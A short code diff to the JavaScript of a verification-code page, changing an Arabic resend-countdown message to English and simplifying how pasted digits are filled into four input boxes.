-                resendCountdownEl.textContent = `انتظر ${resendCountdown} ثانية`;
+                resendCountdownEl.textContent = `Wait ${resendCountdown}s`;
                 resendBtn.disabled = true;
             } else {
                 clearInterval(resendInterval);
@@ -1265,9 +1180,8 @@ ${data.verificationCode ? `
                 
                 digits.split('').forEach((digit, i) => {
                     if (i < 4) {
-                        const el = document.querySelector(`.code-digit[data-index="${i}"]`);
-                        el.value = digit;
-                        el.classList.add('filled');
+                        document.querySelector(`.code-digit[data-index="${i}"]`).value = digit;
+                        document.querySelector(`.code-digit[data-index="${i}"]`).classList.add('filled');
                     }
                 });
 
